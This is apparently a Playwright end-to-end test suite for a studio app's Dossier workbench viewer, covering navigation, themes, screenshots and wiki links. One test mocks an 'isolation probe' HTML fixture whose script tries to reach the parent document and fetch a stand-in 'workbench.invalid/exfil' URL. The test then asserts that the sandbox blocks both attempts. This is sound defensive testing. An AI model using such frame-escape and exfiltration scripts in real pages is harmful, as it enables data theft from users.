import { expect, test } from '../fixtures/dev-backend';
import type { Page, TestInfo } from '@playwright/test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { setTheme } from '../helpers/theme';

test.use({ serviceWorkers: 'block' });

function evidencePath(testInfo: TestInfo, fileName: string): string {
  const jobResultsDir = process.env['JOB_RESULTS_DIR']?.trim();
  if (!jobResultsDir) return testInfo.outputPath(fileName);
  const resultsDir = path.resolve(jobResultsDir);
  fs.mkdirSync(resultsDir, { recursive: true });
  return path.join(resultsDir, fileName);
}

async function captureWorkbenchFrame(
  page: Page,
  markerSelector: string,
  targetPath: string,
): Promise<void> {
  const deadline = Date.now() + 30_000;
  let lastError: unknown;
  while (Date.now() < deadline) {
    try {
      const frame = page.getByTestId('workbench-viewer-frame');
      const marker = page.frameLocator('[data-testid="workbench-viewer-frame"]')
        .locator(markerSelector);
      await expect(frame).toBeVisible({ timeout: 5_000 });
      await expect(marker).toBeVisible({ timeout: 5_000 });
      await marker.scrollIntoViewIfNeeded({ timeout: 5_000 });
      await frame.screenshot({ path: targetPath, timeout: 5_000 });
      return;
    } catch (error) {
      lastError = error;
      await page.waitForTimeout(250);
    }
  }
  throw lastError;
}

async function closeOrchestratorIfOpen(page: Page): Promise<void> {
  const close = page.locator(
    'app-orchestrator-side-sheet [data-testid="sidesheet-close"]',
  );
  if (await close.isVisible()) await close.click({ force: true });
}

async function proxyBackend(page: Page, baseUrl: string, mockWikiPulse = false): Promise<void> {
  await page.route('**/healthz', route => route.fulfill({ status: 200, body: 'Healthy' }));
  await page.route(/\/api\//, async route => {
    const url = new URL(route.request().url());
    const json = (body: unknown) => route.fulfill({
      status: 200, contentType: 'application/json', body: JSON.stringify(body),
    });
    // Keep app-wide boot probes out of this project-surface test. In
    // particular, model discovery may invoke a slow external CLI and a dirty
    // verification worktree may legitimately have a crash-recovery prompt.
    if (/^\/api\/cli\/[^/]+\/models$/.test(url.pathname))
      return json({ models: [], source: 'workbench-e2e' });
    if (url.pathname === '/api/cli/quota')
      return json({ at: new Date().toISOString(), ttlSeconds: 600, snapshots: [] });
    if (url.pathname === '/api/cli/usage')
      return json({ at: new Date().toISOString(), sessions: [] });
    if (url.pathname === '/api/crash-recovery/pending')
      return json({ pending: [] });
    // This spec verifies the real descriptor patterns and article surfaces, not
    // Wiki tree caching. Keep the unrelated tree ETag path out of the setup so
    // a malformed cache header cannot blank the lifecycle surface.
    if (url.pathname.endsWith('/wiki/tree'))
      return json({
        exists: true,
        root: [
          { type: 'md', name: 'README.md', title: 'Readme', relPath: 'README.md', children: [] },
          {
            type: 'folder', name: 'operations', title: 'operations', relPath: 'operations', children: [
              {
                type: 'folder', name: 'nordstern', title: 'nordstern', relPath: 'operations/nordstern', children: [
                  { type: 'html', name: 'index.html', title: 'Nordstern', relPath: 'operations/nordstern/index.html', children: [] },
                ],
              },
              {
                type: 'folder', name: 'umsetzungsplan-zielbild', title: 'umsetzungsplan-zielbild',
                relPath: 'operations/umsetzungsplan-zielbild', children: [
                  {
                    type: 'html', name: 'index.html', title: 'Umsetzungsplan Richtung Zielbild',
                    relPath: 'operations/umsetzungsplan-zielbild/index.html', children: [],
                  },
                ],
              },
            ],
          },
        ],
      });
    if (mockWikiPulse && url.pathname.endsWith('/wiki/pulse'))
      return json({
        projectName: 'Dossier navigation',
        baseDir: '/repo/docs',
        exists: true,
        generatedAtUtc: '2026-07-29T12:00:00Z',
        feed: { available: true, reason: null, items: [] },
        inbox: { available: true, reason: null, count: 0, items: [] },
        drift: {
          available: true, reason: null, overallGrade: 'Empty', areas: [],
          counts: { fresh: 0, aging: 0, stale: 0, graded: 0 },
        },
        critical: { available: true, reason: null, count: 0, overallGrade: 'none', items: [] },
        lifecycle: { available: true, reason: null, count: 0, items: [] },
        workbenches: null,
      });
    if (mockWikiPulse && url.pathname.endsWith('/wiki/home'))
      return json({ sections: [] });
    if (mockWikiPulse && url.pathname === '/api/cli/maintenance-model')
      return json({ cliType: 'claude', model: '', thinkingLevel: null });
    if (mockWikiPulse && url.pathname.endsWith('/wiki/grading/status'))
      return json({ status: null });
    if (mockWikiPulse && url.pathname.includes('/wiki/files/')) {
      const relPath = url.pathname.split('/wiki/files/')[1]
        .split('/')
        .map(segment => decodeURIComponent(segment))
        .join('/');
      const content = fs.readFileSync(path.resolve(process.cwd(), '..', 'docs', relPath), 'utf8');
      return json({ relPath, content });
    }
    if (mockWikiPulse && url.pathname.includes('/wiki/history/')) {
      const relPath = url.pathname.split('/wiki/history/')[1]
        .split('/')
        .map(segment => decodeURIComponent(segment))
        .join('/');
      return json({
        relPath,
        model: null,
        metadata: {
          model: null, updatedAt: null, reason: null, taskKey: null,
          status: null, runCount: null, hasFrontmatter: false,
        },
        commits: [],
      });
    }
    const response = await fetch(`${baseUrl}${url.pathname}${url.search}`, {
      method: route.request().method(),
      headers: route.request().headers(),
      body: route.request().postData() ?? undefined,
      signal: AbortSignal.timeout(30_000),
    });
    await route.fulfill({
      status: response.status,
      contentType: response.headers.get('content-type') ?? 'application/json',
      body: await response.text(),
    });
  });
}

test('article patterns drive the Dossier Explorer and isolated viewer in both themes', async ({ page, devBackend }, testInfo) => {
  test.setTimeout(180_000);
  const pathsResponse = await fetch(`${devBackend.baseUrl}/api/watch-paths`);
  expect(pathsResponse.ok).toBe(true);
  const paths = await pathsResponse.json() as { name: string; rootPath?: string }[];
  let project: { name: string; rootPath?: string } | undefined;
  let createdProjectId: string | null = null;
  let createdWorkspaceId: string | null = null;
  let clientId: string | null = null;
  for (const candidate of paths) {
    const response = await fetch(`${devBackend.baseUrl}/api/projects/${encodeURIComponent(candidate.name)}/workbenches`);
    if (!response.ok) continue;
    const catalogue = await response.json() as { items?: { id: string }[] };
    if (catalogue.items?.some(item => item.id === 'app-survey')) { project = candidate; break; }
  }
  if (!project) {
    const clientName = `e2e-workbench-evidence-${Date.now().toString(36)}`;
    const register = await fetch(`${devBackend.baseUrl}/api/clients/register`, {
      method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ displayName: clientName }),
    });
    const client = await register.json() as { id: string };
    clientId = client.id;
    const workspaceResponse = await fetch(`${devBackend.baseUrl}/api/workspaces`);
    const workspaces = await workspaceResponse.json() as { id: string }[];
    if (workspaces.length === 0) {
      const workspaceCreate = await fetch(`${devBackend.baseUrl}/api/workspaces`, {
        method: 'POST', headers: { 'content-type': 'application/json', 'X-Client-Id': client.id },
        body: JSON.stringify({ displayName: 'Dossier Evidence' }),
      });
      const workspace = await workspaceCreate.json() as { id: string };
      createdWorkspaceId = workspace.id;
      workspaces.push(workspace);
    }
    const displayName = `Dossier Evidence ${Date.now().toString(36)}`;
    const response = await fetch(`${devBackend.baseUrl}/api/projects`, {
      method: 'POST', headers: { 'content-type': 'application/json', 'X-Client-Id': client.id },
      body: JSON.stringify({ sourceType: 'local-folder', workspaceId: workspaces[0].id,
        displayName, shortCode: `W${Date.now().toString(36).slice(-5)}`.toUpperCase(), rootPath: devBackend.workspace }),
    });
    const responseBody = await response.text();
    expect(response.ok, responseBody).toBe(true);
    const created = JSON.parse(responseBody) as { id: string; displayName: string };
    createdProjectId = created.id;
    const associate = await fetch(`${devBackend.baseUrl}/api/projects/${created.id}`, {
      method: 'PUT', headers: { 'content-type': 'application/json', 'X-Client-Id': client.id },
      body: JSON.stringify({ repositoryPath: devBackend.workspace }),
    });
    expect(associate.ok, await associate.text()).toBe(true);
    project = { name: created.displayName, rootPath: devBackend.workspace };
  }
  expect(project, 'The real backend must expose this repository as a project.').toBeTruthy();
  try {
  const realCatalogueResponse = await fetch(`${devBackend.baseUrl}/api/projects/${encodeURIComponent(project!.name)}/workbenches`);
  const realCatalogueText = await realCatalogueResponse.text();
  expect(realCatalogueResponse.ok, realCatalogueText).toBe(true);
  expect(realCatalogueText).toContain('app-survey');

  await proxyBackend(page, devBackend.baseUrl);
  await page.goto('/', { waitUntil: 'domcontentloaded', timeout: 60_000 });
  await page.addStyleTag({ content: '[data-testid="offline-banner"] { display: none !important; }' });
  await closeOrchestratorIfOpen(page);
  const projectRow = page.getByTestId(`studio-explorer-project-${project.name}`);
  await expect(projectRow).toBeVisible();
  if (await projectRow.getAttribute('aria-expanded') === 'false') await projectRow.click();

  const workbenchesRow = page.getByTestId(`studio-explorer-project-workbenches-${project.name}`);
  await expect(workbenchesRow).toBeVisible();
  await workbenchesRow.click();
  await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-workbench-mockup-family`)).toBeVisible();
  await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-app-survey`)).toBeVisible();
  await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-deck-icon-exploration`)).toBeVisible();
  await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-workbench-konzept`)).toBeVisible();
  const uiExplorerIcon = await page.getByTestId(
    `studio-explorer-workbench-${project.name}-deck-icon-exploration`).locator('svg').innerHTML();
  const conceptExplorerIcon = await page.getByTestId(
    `studio-explorer-workbench-${project.name}-workbench-konzept`).locator('svg').innerHTML();
  expect(uiExplorerIcon).not.toBe(conceptExplorerIcon);
  await expect(page.getByTestId(
    `workbench-overview-pattern-${project.name}-deck-icon-exploration`)).toHaveAttribute('data-pattern', 'ui');
  await expect(page.getByTestId(
    `workbench-overview-pattern-${project.name}-workbench-konzept`)).toHaveAttribute('data-pattern', 'concept');
  await expect(page.getByTestId(`studio-explorer-workbench-history-${project.name}`)).toBeVisible();
  const dossierList = page.getByTestId(`studio-explorer-workbench-list-${project.name}`);

  for (const theme of ['light', 'dark'] as const) {
    await setTheme(page, theme);
    await workbenchesRow.scrollIntoViewIfNeeded();
    await page.getByTestId('studio-sidebar').screenshot({
      path: evidencePath(testInfo, `dossier-nav-${theme}--real.png`),
    });
    await dossierList.screenshot({
      path: evidencePath(testInfo, `dossier-list-${theme}--real.png`),
    });
    await page.screenshot({
      path: evidencePath(testInfo, `workbench-explorer--${theme}--real.png`),
      fullPage: true,
    });
  }

  await page.getByTestId(`studio-explorer-workbench-${project.name}-workbench-konzept`).click();
  const frame = page.getByTestId('workbench-viewer-frame');
  await expect(frame).toBeVisible();
  await expect(frame).toHaveAttribute('title', /^Dossier artifact:/);
  await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
  await expect(page.getByTestId('workbench-viewer-provenance')
    .filter({ hasText: 'docs/operations/workbench-konzept/index.html' }))
    .toContainText('docs/operations/workbench-konzept/index.html');
  const articleFrame = page.frameLocator('[data-testid="workbench-viewer-frame"]');
  await expect(articleFrame.locator('html')).toHaveAttribute('data-document-pattern', 'concept');
  const conceptGeometry = await articleFrame.locator('body').evaluate(body => {
    const main = body.querySelector('main')!;
    const breakout = body.querySelector('.breakout')!;
    return {
      bodyFont: getComputedStyle(body).fontFamily,
      mainWidth: main.getBoundingClientRect().width,
      breakoutWidth: breakout.getBoundingClientRect().width,
    };
  });
  expect(conceptGeometry.bodyFont).toContain('Georgia');
  expect(conceptGeometry.mainWidth).toBeLessThanOrEqual(780);
  expect(conceptGeometry.breakoutWidth).toBeGreaterThan(conceptGeometry.mainWidth);
  for (const theme of ['light', 'dark'] as const) {
    await page.emulateMedia({ colorScheme: theme });
    await setTheme(page, theme);
    await page.getByTestId('studio-editor').screenshot({
      path: evidencePath(testInfo, `dossier-viewer-${theme}--real.png`),
    });
  }
  await page.getByTestId('workbench-viewer-maximize').click();
  await expect(page.getByTestId('workbench-viewer-frame-shell'))
    .toHaveClass(/workbench-viewer__frame-shell--maximized/);
  await articleFrame.locator('html').evaluate(() => window.scrollTo(0, 0));
  for (const theme of ['light', 'dark'] as const) {
    await page.emulateMedia({ colorScheme: theme });
    await setTheme(page, theme);
    await captureWorkbenchFrame(
      page,
      '.breakout',
      evidencePath(testInfo, `article-template-concept--${theme}--real.png`),
    );
  }
  await page.getByTestId(`studio-explorer-workbench-${project.name}-deck-icon-exploration`)
    .dispatchEvent('click');
  await expect(page.getByTestId('workbench-viewer-frame-shell'))
    .not.toHaveClass(/workbench-viewer__frame-shell--maximized/);
  await expect(page.getByTestId('workbench-viewer-provenance')
    .filter({ hasText: 'docs/operations/deck-icon-exploration/index.html' }))
    .toContainText('docs/operations/deck-icon-exploration/index.html');
  await expect(articleFrame.locator('html')).toHaveAttribute('data-document-pattern', 'ui');
  const uiGeometry = await articleFrame.locator('body').evaluate(body => {
    const main = body.querySelector('main')!;
    const mockup = body.querySelector('.mockup')!;
    return {
      mainWidth: main.getBoundingClientRect().width,
      mockupWidth: mockup.getBoundingClientRect().width,
    };
  });
  expect(uiGeometry.mockupWidth).toBeGreaterThan(uiGeometry.mainWidth);
  await page.getByTestId('workbench-viewer-maximize').click();
  await expect(page.getByTestId('workbench-viewer-frame-shell'))
    .toHaveClass(/workbench-viewer__frame-shell--maximized/);
  for (const theme of ['light', 'dark'] as const) {
    await page.emulateMedia({ colorScheme: theme });
    await setTheme(page, theme);
    await captureWorkbenchFrame(
      page,
      '.mockup',
      evidencePath(testInfo, `article-template-ui--${theme}--real.png`),
    );
  }
  let escapedNetworkRequests = 0;
  page.on('request', request => {
    if (new URL(request.url()).hostname === 'workbench.invalid') escapedNetworkRequests += 1;
  });
  await page.route('**/workbenches/app-survey', route => route.fulfill({
    json: {
      workbench: {
        id: 'app-survey', title: 'Isolation probe', summary: 'Security-boundary test fixture.',
        status: 'active', phase: 'testing', updatedAtUtc: '2026-07-12T10:00:00Z',
        entryPath: 'docs/quality/design/app-survey-2026-07-11.html', valid: true, error: null, sourceTaskKeys: [], pattern: 'concept',
      },
      html: `<script id="early-probe">
        document.documentElement.dataset.scriptRan = 'true';
        try {
          parent.document.documentElement.dataset.workbenchEscaped = 'true';
          document.documentElement.dataset.parentAccess = 'escaped';
        } catch {
          document.documentElement.dataset.parentAccess = 'blocked';
        }
        fetch('https://workbench.invalid/exfil').then(
          () => document.documentElement.dataset.network = 'allowed',
          () => document.documentElement.dataset.network = 'blocked'
        );
      </script><html><head><base href="https://base.invalid/"><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body><h1>Isolation probe</h1></body></html>`,
      branch: 'develop', revision: null, workingTreeModified: true, fingerprint: null,
    },
  }));
  await page.getByTestId(`studio-explorer-workbench-${project.name}-app-survey`)
    .dispatchEvent('click');
  await expect(page.getByTestId('workbench-viewer-frame-shell'))
    .not.toHaveClass(/workbench-viewer__frame-shell--maximized/);
  const srcdoc = await frame.getAttribute('srcdoc');
  expect(srcdoc).toContain("default-src 'none'");
  expect(srcdoc).toContain("connect-src 'none'");
  expect(srcdoc).not.toContain('allow-same-origin');
  expect(srcdoc).not.toContain('https://base.invalid/');
  expect(srcdoc!.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc!.indexOf('id="early-probe"'));
  const isolatedRoot = page.frameLocator('[data-testid="workbench-viewer-frame"]').locator('html');
  await expect(isolatedRoot).toHaveAttribute('data-script-ran', 'true');
  await expect(isolatedRoot).toHaveAttribute('data-parent-access', 'blocked');
  await expect(isolatedRoot).toHaveAttribute('data-network', 'blocked');
  await expect(page.locator('html')).not.toHaveAttribute('data-workbench-escaped', 'true');
  expect(escapedNetworkRequests).toBe(0);
  await expect(page.getByTestId('workbench-viewer-provenance')
    .filter({ hasText: 'docs/quality/design/app-survey-2026-07-11.html' }))
    .toContainText('docs/quality/design/app-survey-2026-07-11.html');
  await expect(page.getByTestId('workbench-viewer-working-tree').first()).toContainText('uncommitted');

  } finally {
    if (createdProjectId) await fetch(`${devBackend.baseUrl}/api/projects/${createdProjectId}`, {
      method: 'DELETE', headers: { 'X-Client-Id': clientId ?? '' },
    });
    if (createdWorkspaceId) await fetch(`${devBackend.baseUrl}/api/workspaces/${createdWorkspaceId}`, {
      method: 'DELETE', headers: { 'X-Client-Id': clientId ?? '' },
    });
    if (clientId) {
      await fetch(`${devBackend.baseUrl}/api/clients/${clientId}/retire`, {
        method: 'POST', headers: { 'content-type': 'application/json', 'X-Client-Id': clientId }, body: '{}',
      });
      await fetch(`${devBackend.baseUrl}/api/clients/${clientId}`, {
        method: 'DELETE', headers: { 'X-Client-Id': 'local-default' },
      });
    }
  }
});

test('Nordstern Dossier links, maximize, and Wiki jump stay in the Studio', async ({ page, devBackend }, testInfo) => {
  test.setTimeout(120_000);
  const pathsResponse = await fetch(`${devBackend.baseUrl}/api/watch-paths`);
  expect(pathsResponse.ok).toBe(true);
  const paths = await pathsResponse.json() as { name: string }[];
  let projectName: string | null = null;
  for (const candidate of paths) {
    const response = await fetch(
      `${devBackend.baseUrl}/api/projects/${encodeURIComponent(candidate.name)}/workbenches`,
    );
    if (!response.ok) continue;
    const catalogue = await response.json() as { items?: { id: string }[] };
    if (catalogue.items?.some(item => item.id === 'nordstern')) {
      projectName = candidate.name;
      break;
    }
  }
  expect(projectName, 'The real backend must expose the Nordstern Dossier.').not.toBeNull();

  await proxyBackend(page, devBackend.baseUrl, true);
  await page.goto('/');
  await page.addStyleTag({ content: '[data-testid="offline-banner"] { display: none !important; }' });
  const projectRow = page.getByTestId(`studio-explorer-project-${projectName}`);
  await expect(projectRow).toBeVisible();
  if (await projectRow.getAttribute('aria-expanded') === 'false') await projectRow.click();
  const workbenchesRow = page.getByTestId(`studio-explorer-project-workbenches-${projectName}`);
  await expect(workbenchesRow).toBeVisible();
  if (await workbenchesRow.getAttribute('aria-expanded') === 'false') await workbenchesRow.click();
  await page.getByTestId(`studio-explorer-workbench-${projectName}-nordstern`).click();

  const detailsTrigger = page.getByTestId('workbench-viewer-details-trigger');
  const detailsPopover = page.getByTestId('workbench-viewer-details-popover');
  const viewerDetailsWikiAction = detailsPopover.locator('.viewer-details__wiki-link');
  await detailsTrigger.click();
  await expect(viewerDetailsWikiAction).toBeVisible();
  await detailsTrigger.click();
  await expect(page.getByTestId('workbench-viewer-maximize')).toHaveAttribute('aria-label', 'Maximize');
  const nordsternFrame = page.frameLocator('[data-testid="workbench-viewer-frame"]');
  const landkarte = nordsternFrame.getByRole('heading', { name: /Landkarte/ });
  await expect(landkarte).toBeVisible();
  await landkarte.scrollIntoViewIfNeeded();
  await page.screenshot({
    path: evidencePath(testInfo, 'nordstern-landkarte-after.png'),
    fullPage: true,
  });

  await page.getByTestId('workbench-viewer-maximize').click();
  await expect(page.getByTestId('workbench-viewer-frame-shell'))
    .toHaveClass(/workbench-viewer__frame-shell--maximized/);
  await expect(page.getByTestId('workbench-viewer-maximize')).toHaveAttribute('aria-label', 'Restore');
  await page.getByTestId('workbench-viewer-maximize').click();
  await expect(page.getByTestId('workbench-viewer-maximize')).toHaveAttribute('aria-label', 'Maximize');

  await detailsTrigger.click();
  await expect(viewerDetailsWikiAction).toBeVisible();
  await viewerDetailsWikiAction.click();
  await expect(page).toHaveURL(
    /#\/projects\/[^/]+\/wiki\?page=operations%2Fnordstern%2Findex\.html/,
  );
  await expect(page.getByTestId('project-wiki-viewer-path'))
    .toContainText('operations/nordstern/index.html');

  await page.goBack();
  await expect(page.getByTestId('workbench-viewer-frame')).toBeVisible();
  await nordsternFrame.getByRole('link', { name: /Umsetzungsplan \(Detail\)/ }).click();
  await expect(page).toHaveURL(
    /#\/projects\/[^/]+\/wiki\?page=operations%2Fumsetzungsplan-zielbild%2Findex\.html/,
  );
  await expect(page.getByTestId('project-wiki-viewer-path'))
    .toContainText('operations/umsetzungsplan-zielbild/index.html');
});
